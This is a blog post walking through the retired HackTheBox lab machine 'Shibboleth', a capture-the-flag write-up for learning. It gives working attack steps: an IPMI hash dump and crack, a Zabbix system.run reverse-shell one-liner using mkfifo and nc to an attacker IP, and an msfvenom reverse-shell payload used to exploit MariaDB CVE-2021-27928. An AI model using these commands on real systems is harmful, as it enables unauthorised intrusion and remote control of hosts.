<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox: Shibboleth Walkthrough | Micha's Attic</title><meta name=keywords content="hackthebox,ctf"><meta name=description content="Introduction This is my first walkthrough for a HackTheBox machine. It&rsquo;s not the first machine I&rsquo;ve done, though. But as Shibboleth is now &ldquo;retired&rdquo;, it is allowed to publish walkthroughs. I have decided not to publish any passwords, because that would spoil the fun (and not add anything in terms of learning). I&rsquo;ll rather focus on my chain of thought to go through this challenge.
Foothold The very first scan on every machine I do is a port scan using nmap."><meta name=author content="Micha"><link rel=canonical href=https://blog.micha.gg/2022/04/22/hackthebox-shibboleth-walkthrough/><link crossorigin=anonymous href=/assets/css/stylesheet.min.79a4c9cb65f7123f4c4abeceb6301a04f3860036c1b9bf5fe9749f7df83ac0cf.css integrity="sha256-eaTJy2X3Ej9MSr7OtjAaBPOGADbBub9f6XSfffg6wM8=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.micha.gg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.micha.gg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.micha.gg/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.micha.gg/apple-touch-icon.png><link rel=mask-icon href=https://blog.micha.gg/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.97.3"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox: Shibboleth Walkthrough"><meta property="og:description" content="Introduction This is my first walkthrough for a HackTheBox machine. It&rsquo;s not the first machine I&rsquo;ve done, though. But as Shibboleth is now &ldquo;retired&rdquo;, it is allowed to publish walkthroughs. I have decided not to publish any passwords, because that would spoil the fun (and not add anything in terms of learning). I&rsquo;ll rather focus on my chain of thought to go through this challenge.
Foothold The very first scan on every machine I do is a port scan using nmap."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.micha.gg/2022/04/22/hackthebox-shibboleth-walkthrough/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-22T17:36:59+02:00"><meta property="article:modified_time" content="2022-04-22T17:36:59+02:00"><meta property="og:site_name" content="Micha's Attic"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Shibboleth Walkthrough"><meta name=twitter:description content="Introduction This is my first walkthrough for a HackTheBox machine. It&rsquo;s not the first machine I&rsquo;ve done, though. But as Shibboleth is now &ldquo;retired&rdquo;, it is allowed to publish walkthroughs. I have decided not to publish any passwords, because that would spoil the fun (and not add anything in terms of learning). I&rsquo;ll rather focus on my chain of thought to go through this challenge.
Foothold The very first scan on every machine I do is a port scan using nmap."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.micha.gg/posts/"},{"@type":"ListItem","position":2,"name":"HackTheBox: Shibboleth Walkthrough","item":"https://blog.micha.gg/2022/04/22/hackthebox-shibboleth-walkthrough/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox: Shibboleth Walkthrough","name":"HackTheBox: Shibboleth Walkthrough","description":"Introduction This is my first walkthrough for a HackTheBox machine. It\u0026rsquo;s not the first machine I\u0026rsquo;ve done, though. But as Shibboleth is now \u0026ldquo;retired\u0026rdquo;, it is allowed to publish walkthroughs. I have decided not to publish any passwords, because that would spoil the fun (and not add anything in terms of learning). I\u0026rsquo;ll rather focus on my chain of thought to go through this challenge.\nFoothold The very first scan on every machine I do is a port scan using nmap.","keywords":["hackthebox","ctf"],"articleBody":"Introduction This is my first walkthrough for a HackTheBox machine. It‚Äôs not the first machine I‚Äôve done, though. But as Shibboleth is now ‚Äúretired‚Äù, it is allowed to publish walkthroughs. I have decided not to publish any passwords, because that would spoil the fun (and not add anything in terms of learning). I‚Äôll rather focus on my chain of thought to go through this challenge.\nFoothold The very first scan on every machine I do is a port scan using nmap. Depending on the results, I continue to directory and/or vhost (subdomain) scanning.\nFirst an nmap scan only reveals 80/tcp as an open port. I have yet to encounter a machine where this port is not open, as every machine has some kind of ‚Äúlanding page‚Äù. In this case, where a tcp port scan does not reveal anything interesting, it‚Äôs not a bad idea to also scan udp ports:\nDiscovered open port 623/udp on 10.10.11.124 Now that‚Äôs something! A quick search reveals that 623/udp is the default port for IPMI, which is some kind of remote management interface.\nSearching a bit further, we find common vulnerabilities for IPMI. One that sounds especially promising is dumping the hashes. Conveniently, the metasploit framework comes with a payload for this task.\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes)  run  [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:25b6d5c382010... When obtaining a hash, and it‚Äôs an ‚Äúinsecure‚Äù one (that is, not bcrypt or similar), I put it into hashcat right away. In this case, we need to pick the right hash type. My hashcat version suggested three, and -m 7300 is the correct one in this case. I‚Äôm using the ‚Äúrockyou‚Äù wordlist, which also yields a result in this case.\nNow we have a username and password, but what next? I tried playing around with IPMI a bit more - there seem to be ways to get a reverse shell, but those were not working with this IPMI instance.\nBut, we are also not done with scanning! Let‚Äôs scan for vhosts next:\nFound: monitor.shibboleth.htb (Status: 200) [Size: 3686] Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686] Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686] Again, this looks promising. All vhosts point to the same Zabbix instance. Let‚Äôs login with the credentials we obtained earlier!\nUser We now have adminisrator access to Zabbix. The installed Zabbix version 5.0.17 does not have any known vulnerability. But, Zabbix is a monitoring software and as such for sure has the capability to execute commands on the machines it is monitoring. Time to RTFM üò±\nUnder Configuration  Items  Item types  Zabbix agent we will find:\n system.run[command,] - Run specified command on the host.\n Exactly what we are looking for! Note that this seems to be an intentional misconfiguration on this machine, because the docs also say:\n All system.run[*] items (remote commands, scripts) are disabled by default, even when no deny keys are specified\n We now know that we can create an ‚ÄúItem‚Äù for the shibboleth.htb host in the Zabbix UI. I tried a lot of different reverse shell commands until I finally found one which was working in this context:\nsystem.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u00261|nc 10.10.14.5 4444 /tmp/f,nowait] Click on Test  Get Value and Test. We now have a reverse shell for user zabbix.\n$ id uid=110(zabbix) gid=118(zabbix) groups=118(zabbix) $ ls -la /home total 12 drwxr-xr-x 3 root root 4096 Oct 16 2021 . drwxr-xr-x 19 root root 4096 Oct 16 2021 .. drwxr-xr-x 3 ipmi-svc ipmi-svc 4096 Oct 16 2021 ipmi-svc We also see the only entry in /home is for user ipmi-svc, so we now have to escalate to this user. We do have a password, so try the straight-forward way:\n$ su ipmi-svc Password:  id uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc) Done - we can read the user flag!\nRoot Our next step is to gain root access. If there is no obvious way forward, running LinPEAS usually gives us a hint: On this machine, there is a config file /etc/zabbix/zabbix_server.conf, which is owned by root - and readable by the current user! In this file, we will find credentials for a database server. Let‚Äôs try them out:\n$ mysql -u zabbix -p zabbix  MariaDB [zabbix] select version(); +----------------------------------+ | version() | +----------------------------------+ | 10.3.25-MariaDB-0ubuntu0.20.04.1 | +----------------------------------+ 1 row in set (0.000 sec) Looking up vulnerabilities for this MariaDB version leads to CVE-2021-27928. We can use metasploit again, this time to build a payload:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4242 -f elf-so -o payload.so Connect to the MariaDB server, execute the payload:\nmysql -u zabbix -p -e 'SET GLOBAL wsrep_provider=\"/tmp/payload.so\";' Conclusion and Learnings I really liked the Shibboleth machine. Probably because it wasn‚Äôt ‚Äúthe usual web stuff‚Äù. Most of the time I needed was to understand how Zabbix works, and then to get the reverse shell working. This is also a key learning for me: If you ‚Äúknow‚Äù you are on the right track, but it‚Äôs not working, try another way. This machine was the first time I used (and needed) a ‚Äúmkfifo reverse shell‚Äù. Furthermore, I learned about msfvenom.\n","wordCount":"838","inLanguage":"en","datePublished":"2022-04-22T17:36:59+02:00","dateModified":"2022-04-22T17:36:59+02:00","author":{"@type":"Person","name":"Micha"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.micha.gg/2022/04/22/hackthebox-shibboleth-walkthrough/"},"publisher":{"@type":"Organization","name":"Micha's Attic","logo":{"@type":"ImageObject","url":"https://blog.micha.gg/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.micha.gg/ accesskey=h title="Micha's Attic (Alt + H)">Micha's Attic</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://blog.micha.gg/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.micha.gg/>Home</a>&nbsp;¬ª&nbsp;<a href=https://blog.micha.gg/posts/>Posts</a></div><h1 class=post-title>HackTheBox: Shibboleth Walkthrough</h1><div class=post-meta><span title="2022-04-22 17:36:59 +0200 +0200">April 22, 2022</span>&nbsp;¬∑&nbsp;4 min&nbsp;¬∑&nbsp;Micha</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a></li><li><a href=#foothold aria-label=Foothold>Foothold</a></li><li><a href=#user aria-label=User>User</a></li><li><a href=#root aria-label=Root>Root</a></li><li><a href=#conclusion-and-learnings aria-label="Conclusion and Learnings">Conclusion and Learnings</a></li></ul></div></details></div><div class=post-content><h1 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>This is my first walkthrough for a HackTheBox machine. It&rsquo;s not the first
machine I&rsquo;ve done, though. But as Shibboleth is now &ldquo;retired&rdquo;, it is allowed
to publish walkthroughs. I have decided not to publish any passwords,
because that would spoil the fun (and not add anything in terms of learning).
I&rsquo;ll rather focus on my chain of thought to go through this challenge.</p><h1 id=foothold>Foothold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h1><p>The very first scan on every machine I do is a port scan using nmap. Depending on
the results, I continue to directory and/or vhost (subdomain) scanning.</p><p>First an nmap scan only reveals <code>80/tcp</code> as an open port. I have yet to encounter a machine
where this port is not open, as every machine has some kind of &ldquo;landing page&rdquo;.
In this case, where a tcp port scan does not reveal anything interesting,
it&rsquo;s not a bad idea to also scan udp ports:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>Discovered open port 623/udp on 10.10.11.124
</span></span></code></pre></div><p>Now that&rsquo;s something! A quick search reveals that <code>623/udp</code> is the default port for IPMI,
which is some kind of remote management interface.</p><p>Searching a bit further, we find common vulnerabilities for IPMI. One that
sounds especially promising is dumping the hashes. Conveniently, the metasploit framework
comes with a payload for this task.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:25b6d5c382010...
</span></span></code></pre></div><p>When obtaining a hash, and it&rsquo;s an &ldquo;insecure&rdquo; one (that is, not bcrypt or similar),
I put it into hashcat right away. In this case, we need to pick the right
hash type. My hashcat version suggested three, and <code>-m 7300</code> is the correct one in this case.
I&rsquo;m using the &ldquo;rockyou&rdquo; wordlist, which also yields a result in this case.</p><p>Now we have a username and password, but what next? I tried playing around
with IPMI a bit more - there seem to be ways to get a reverse shell, but those
were not working with this IPMI instance.</p><p>But, we are also not done with scanning! Let&rsquo;s scan for vhosts next:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
</span></span><span style=display:flex><span>Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
</span></span><span style=display:flex><span>Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
</span></span></code></pre></div><p>Again, this looks promising. All vhosts point to the same Zabbix instance.
Let&rsquo;s login with the credentials we obtained earlier!</p><h1 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h1><p>We now have adminisrator access to Zabbix. The installed Zabbix version 5.0.17
does not have any known vulnerability. But, Zabbix is a monitoring software
and as such for sure has the capability to execute commands on the machines
it is monitoring. Time to RTFM üò±</p><p>Under <em>Configuration > Items > Item types > Zabbix agent</em> we will find:</p><blockquote><p><code>system.run[command,&lt;mode>]</code> - Run specified command on the host.</p></blockquote><p>Exactly what we are looking for! Note that this seems to be an intentional
misconfiguration on this machine, because the docs also say:</p><blockquote><p>All <code>system.run[*]</code> items (remote commands, scripts) are disabled by default, even when no deny keys are specified</p></blockquote><p>We now know that we can create an &ldquo;Item&rdquo; for the <code>shibboleth.htb</code> host in
the Zabbix UI.
I tried a lot of different reverse shell commands until I finally found one which
was working in this context:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.5 4444 &gt;/tmp/f,nowait]
</span></span></code></pre></div><p>Click on <em>Test > Get Value and Test</em>. We now have a reverse shell for user <code>zabbix</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
</span></span><span style=display:flex><span>$ ls -la /home
</span></span><span style=display:flex><span>total 12
</span></span><span style=display:flex><span>drwxr-xr-x  3 root     root     4096 Oct 16  2021 .
</span></span><span style=display:flex><span>drwxr-xr-x 19 root     root     4096 Oct 16  2021 ..
</span></span><span style=display:flex><span>drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Oct 16  2021 ipmi-svc
</span></span></code></pre></div><p>We also see the only entry in <code>/home</code> is for user <code>ipmi-svc</code>, so we now have to escalate to this
user. We <em>do</em> have a password, so try the straight-forward way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ su ipmi-svc
</span></span><span style=display:flex><span>Password: &lt;password&gt;
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
</span></span></code></pre></div><p>Done - we can read the user flag!</p><h1 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h1><p>Our next step is to gain root access. If there is no obvious way forward,
running LinPEAS usually gives us a hint: On this machine, there is a config
file <code>/etc/zabbix/zabbix_server.conf</code>, which is owned by root - and readable by the current user!
In this file, we will find credentials for a database server. Let&rsquo;s try them out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ mysql -u zabbix -p&lt;password&gt; zabbix
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MariaDB [zabbix]&gt; select version();
</span></span><span style=display:flex><span>+----------------------------------+
</span></span><span style=display:flex><span>| version()                        |
</span></span><span style=display:flex><span>+----------------------------------+
</span></span><span style=display:flex><span>| 10.3.25-MariaDB-0ubuntu0.20.04.1 |
</span></span><span style=display:flex><span>+----------------------------------+
</span></span><span style=display:flex><span>1 row in set (0.000 sec)
</span></span></code></pre></div><p>Looking up vulnerabilities for this MariaDB version leads to <code>CVE-2021-27928</code>.
We can use metasploit again, this time to build a payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4242 -f elf-so -o payload.so
</span></span></code></pre></div><p>Connect to the MariaDB server, execute the payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>mysql -u zabbix -p&lt;password&gt; -e &#39;SET GLOBAL wsrep_provider=&#34;/tmp/payload.so&#34;;&#39;
</span></span></code></pre></div><h1 id=conclusion-and-learnings>Conclusion and Learnings<a hidden class=anchor aria-hidden=true href=#conclusion-and-learnings>#</a></h1><p>I really liked the Shibboleth machine. Probably because it wasn&rsquo;t &ldquo;the usual
web stuff&rdquo;. Most of the time I needed was to understand
how Zabbix works, and then to get the reverse shell working. This is also
a key learning for me: If you &ldquo;know&rdquo; you are on the right track, but it&rsquo;s
not working, try another way. This machine was the first time I used
(and needed) a &ldquo;mkfifo reverse shell&rdquo;. Furthermore, I learned about <code>msfvenom</code>.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.micha.gg/tags/hackthebox/>hackthebox</a></li><li><a href=https://blog.micha.gg/tags/ctf/>ctf</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.micha.gg/>Micha's Attic</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>